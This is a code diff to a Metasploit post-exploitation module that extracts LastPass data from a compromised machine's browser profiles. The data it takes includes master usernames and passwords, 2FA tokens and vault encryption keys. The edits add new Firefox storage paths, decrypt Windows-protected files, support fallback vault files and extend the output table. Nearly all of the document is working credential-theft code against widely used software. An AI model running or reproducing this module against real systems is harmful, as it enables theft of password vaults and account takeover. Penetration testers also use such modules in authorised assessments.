@@ -13,7 +13,7 @@ class Metasploit3 < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'LastPass Master Password Extractor',
+        'Name' => 'LastPass Vault Decryptor',
         'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords, encryption keys, 2FA tokens and all the vault passwords',
         'License' => MSF_LICENSE,
         'Author' => [
@@ -44,9 +44,6 @@ class Metasploit3 < Msf::Post
 
     print_status "Extracting credentials"
     extract_credentials(account_map)
-
-    #print_status "Decrypting local stored key"
-    #decrypt_local_vault_key(account_map)
 
     print_status "Extracting 2FA tokens"
     extract_2fa_tokens(account_map)
@@ -118,7 +115,7 @@ class Metasploit3 < Msf::Post
         }
         localstorage_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
-          'Firefox' => "#{user_profile['LocalAppData']}/LastPass",
+          'Firefox' => "#{user_profile['AppData']}/Containers/com.lastpass.LastPass/Data/Library/Application Support/LastPass",
           'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
           'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
         }
@@ -254,28 +251,32 @@ class Metasploit3 < Msf::Post
   end
 
   # Parses the Firefox preferences file and returns encoded credentials
-  def firefox_credentials(loot_path)
+  def firefox_credentials(prefs_path, localstorage_db_path)
     credentials = []
-    File.readlines(loot_path).each do |line|
+    File.readlines(prefs_path).each do |line|
       if /user_pref\("extensions.lastpass.loginusers", "(?<encoded_users>.*)"\);/ =~ line
         usernames = encoded_users.split("|")
         usernames.each do |username|
           credentials << [username, nil]
         end
-      elsif /user_pref\("extensions.lastpass.loginpws", "(?<encoded_creds>.*)"\);/ =~ line
-        creds_per_user = encoded_creds.split("|")
-        creds_per_user.each do |user_creds|
-          parts = user_creds.split('=')
-          for creds in credentials # Check if we have the username already
-            if creds[0] == parts[0]
-              creds[1] = parts[1] # Add the password to the existing username
-            else
-              credentials << parts if parts.size > 1 # Add full credentials
-            end
-          end
+        break
+      end
+    end
+
+    # Extract master passwords
+    path = localstorage_db_path + client.fs.file.separator + "lp.loginpws"
+    data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
+    data = windows_unprotect(data) if data != nil && data.match(/^AQAAA.+/) # Verify Windows protection
+    data.blank? ? return : data = Base64.decode64(data)
+    creds_per_user = data.split("|")
+    creds_per_user.each do |user_creds|
+      parts = user_creds.split('=')
+      for creds in credentials # Check if we have the username already
+        if creds[0] == parts[0]
+          creds[1] = parts[1] # Add the password to the existing username
+        else
+          credentials << parts if parts.size > 1 # Add full credentials
         end
-      else
-        next
       end
     end
 
@@ -321,7 +322,7 @@ class Metasploit3 < Msf::Post
             )
 
             # Extract usernames and passwords from preference file
-            ffcreds = firefox_credentials(loot_path)
+            ffcreds = firefox_credentials(loot_path, paths['localstorage_db'] )
             unless ffcreds.blank?
               ffcreds.each do |creds|
                 if creds[1].blank? # No master password found
@@ -416,13 +417,13 @@ class Metasploit3 < Msf::Post
     lastpass_data_table = Rex::Ui::Text::Table.new(
       'Header' => "LastPass Accounts",
       'Indent' => 1,
-      'Columns' => %w(Account LP_Username LP_Password LP_2FA LP_Key)
+      'Columns' => %w(Account Browser LP_Username LP_Password LP_2FA LP_Key)
     )
 
     account_map.each_pair do |account, browser_map|
       browser_map.each_pair do |browser, lp_data|
         lp_data['lp_creds'].each_pair do |username, user_data|
-          lastpass_data_table << [account, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
+          lastpass_data_table << [account, browser, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
         end
       end
     end
@@ -459,8 +460,15 @@ class Metasploit3 < Msf::Post
               nil,
               "#{account}'s #{browser} LastPass iterations"
             )
-            path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.act.sxml"
-            vault = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
+            path = client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username)
+            if client.fs.file.exists?(path + "_lps.act.sxml")
+              path = path + "_lps.act.sxml"
+            elsif client.fs.file.exists?(path + "_lps.sxml")
+              path = path + "_lps.sxml"
+            else
+              next # No vault found
+            end
+            vault = read_file(path)
             vault = windows_unprotect(vault) if vault != nil && vault.match(/^AQAAA.+/) # Verify Windows protection
             vault = vault.sub(/iterations=.*;/, "") # Remove iterations info
             loot_path = store_loot(
@@ -526,9 +534,9 @@ class Metasploit3 < Msf::Post
               decrypt_local_vault_key(account, browser_map) 
               browser_checked = true
             end
-            if lp_data['lp_creds'][username]['vault_key'] == nil # If not vault key was found yet, try with dOTP
-              otpbin = extract_otpbin(account, browser, username, lp_data)
-              lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
+            if lp_data['lp_creds'][username]['vault_key'] == nil # If no vault key was found yet, try with dOTP
+              ##otpbin = extract_otpbin(account, browser, username, lp_data)
+              ##lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
             end
           end
         end
